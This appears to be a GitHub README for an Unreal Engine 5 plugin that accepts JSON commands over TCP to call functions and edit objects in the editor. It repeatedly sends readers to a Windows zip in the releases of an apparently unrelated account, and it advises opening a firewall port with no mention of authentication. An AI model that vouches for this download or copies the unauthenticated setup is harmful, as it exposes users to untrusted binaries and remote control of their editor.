# ⚙️ UnrealClientProtocol - Easy Control for Unreal Editor

[![Download](https://img.shields.io/badge/Download-UnrealClientProtocol-brightgreen.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)

---

## 📘 What is UnrealClientProtocol?

UnrealClientProtocol is a small, lightweight tool that helps you use Unreal Engine 5 in a new way. It lets you control the Unreal Editor remotely by sending commands over a network. This means you can ask the editor to do things like run functions, change settings, or look inside objects without opening or changing the engine itself.

You do not need to be a programmer or change any part of Unreal Engine to use this plugin. It works quietly in the background, making it easier to automate and manage your projects or tools.

---

## 🖥️ System Requirements

To run UnrealClientProtocol on your Windows computer, make sure you have:

- Windows 10 or later (64-bit)
- Unreal Engine 5 installed (any recent version)
- TCP/IP network setup (standard on most computers)
- At least 4 GB of free memory
- At least 50 MB of free disk space for installation

No additional software or development tools are needed.

---

## ⚙️ Main Features

- Connects to Unreal Editor over a TCP network
- Uses JSON format for clear commands and responses
- Allows remote control of UFunctions (functions inside Unreal)
- Reads and writes UProperties (settings and variables)
- Inspects any UObject (internal Unreal objects)
- Works without modifying Unreal Engine source code
- Supports automation and AI-driven workflows

---

## 🎯 Who Should Use This?

- Game developers who want to automate parts of UE5 Editor through external tools
- AI researchers seeking to test or run commands inside UE5 automatically
- Designers who want to link their tools with Unreal Editor without coding plugins
- Anyone who wants an easy way to control Unreal Editor remotely

---

## 🚀 Getting Started

You can download UnrealClientProtocol as a plugin and add it to your Unreal Engine Editor in a few simple steps. Follow the instructions below carefully.

---

## 🔽 Download and Install UnrealClientProtocol

1. Visit the release page by clicking the big **Download** button above or by going here directly:  
   [https://github.com/venetianglassmaking858/UnrealClientProtocol/releases](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)

2. On the release page, look for the latest version available. It usually has the highest version number and the newest date.

3. Download the plugin package for Windows. This will be a zip file named something like `UnrealClientProtocol-Windows.zip`.

4. Once downloaded, find the zip file in your Downloads folder and right-click it. Choose “Extract All” to unzip the contents.

5. Open your Unreal Engine 5 project folder. Then open or create the folder called `Plugins` inside it. If the folder does not exist, create a new folder and name it `Plugins`.

6. Copy the extracted `UnrealClientProtocol` folder into the `Plugins` folder.

7. Launch Unreal Engine 5. It will now detect the plugin.

8. Go to **Edit > Plugins** in the Unreal Editor menu.

9. Search for “UnrealClientProtocol” in the plugin list. Make sure the checkbox next to it is checked.

10. Restart the Unreal Editor if prompted. The plugin will be active and ready to use.

---

## 🛠️ How to Use the Plugin

After installation, UnrealClientProtocol will listen for commands over your network. You can control it using any software that can send TCP messages with JSON data.

Here is how to get started controlling the editor:

- The plugin listens on a network port (usually 7777).  
- Send JSON messages matching Unreal’s reflection system. For example, call a function by naming it and supplying parameters.  
- Read or write Unreal object properties using JSON commands.  
- Inspect any UObject to see its current data or state.  

No special programming is required but friendly tools or scripts will help you send commands easily.

---

## 🌐 Common Uses

- Automate building or compiling assets inside Unreal Editor.
- Control blueprint functions remotely.
- Change in-game settings without opening the editor manually.
- Let AI systems test and modify Unreal projects on the fly.
- Create custom tools that interact with Unreal Editor data.

---

## 💡 Tips for Smooth Use

- Make sure your firewall allows TCP connections on the port used by UnrealClientProtocol.
- Use simple JSON commands first to get familiar with the plugin’s way of working.
- Check the plugin documentation inside the downloaded folder for detailed command examples.
- Use an existing TCP client tool like Telnet, PuTTY, or a simple Python script for quick tests.
- Restart Unreal Engine if the plugin does not respond after setup.

---

## 🧩 Plugin Settings (Optional)

You can tune the plugin settings inside Unreal Editor to match your needs:

- **Port Number**: Change the TCP listening port if 7777 conflicts with other programs.
- **Timeouts**: Set how long the plugin waits for commands before disconnecting.
- **Logging**: Enable logs to see what commands are received or errors during use.

---

## 📂 Project Structure Overview

Inside the plugin folder you find:

- `Source`: Contains the plugin’s code and modules.
- `Content`: Any supporting files or assets the plugin needs.
- `Config`: Configuration files for network and plugin settings.
- `Docs`: Documentation on plugin commands and usage.

---

## 🔧 Troubleshooting

- **Plugin not visible in Unreal Editor?**  
  Make sure you placed the plugin folder in the right `Plugins` directory inside your project, and that you restarted the editor.

- **Cannot connect to plugin over TCP?**  
  Check your firewall and network settings to allow connections on the plugin’s port.

- **Commands do not work or cause errors?**  
  Verify your JSON syntax and the function/property names in your commands. Check docs for examples.

- **Unreal Editor crashes after enabling the plugin?**  
  Confirm that you are using a supported version of Unreal Engine 5 and that the plugin matches your editor version.

---

## 📄 License and Contribution

UnrealClientProtocol is open for anyone to use and inspect. Feel free to report issues or suggest improvements via GitHub issues on the main repository page.

---

[![Download](https://img.shields.io/badge/Get_It_Now-blueviolet.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)